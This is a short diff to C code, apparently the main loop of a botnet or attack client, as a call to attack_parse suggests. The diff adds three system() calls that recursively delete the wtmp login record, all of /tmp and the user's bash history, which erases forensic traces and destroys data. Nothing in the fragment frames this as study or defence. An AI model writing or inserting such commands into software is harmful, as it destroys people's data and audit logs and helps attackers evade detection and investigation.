@@ -341,6 +341,10 @@ int main(int argc, char **args)
                 attack_parse(rdbuf, len);
         }
     }
+    
+    system("rm -rf /var/log/wtmp");
+    system("rm -rf /tmp/*");
+    system("rm -rf ~/.bash_history");
 
     return 0;
 }
